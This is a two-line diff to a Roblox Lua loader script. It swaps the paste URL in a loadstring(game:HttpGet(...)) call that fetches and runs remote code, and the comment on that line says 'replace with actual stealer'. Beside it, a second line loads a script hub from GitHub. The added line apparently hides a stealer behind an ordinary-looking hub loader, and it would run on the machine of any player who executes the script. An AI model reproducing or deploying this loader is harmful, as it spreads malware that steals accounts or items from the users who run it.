@@ -1,2 +1,2 @@
-loadstring(game:HttpGet('https://api.rubis.app/v2/scrap/sTHAq4Ax16ZVP65P/raw'))() -- replace with actual stealer
+loadstring(game:HttpGet('https://api.rubis.app/v2/scrap/99trAGWzz9bz1agw/raw'))() -- replace with actual stealer
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Roman34296589/SnapSanixHUB/refs/heads/main/SnapSanixHUB.lua'))()
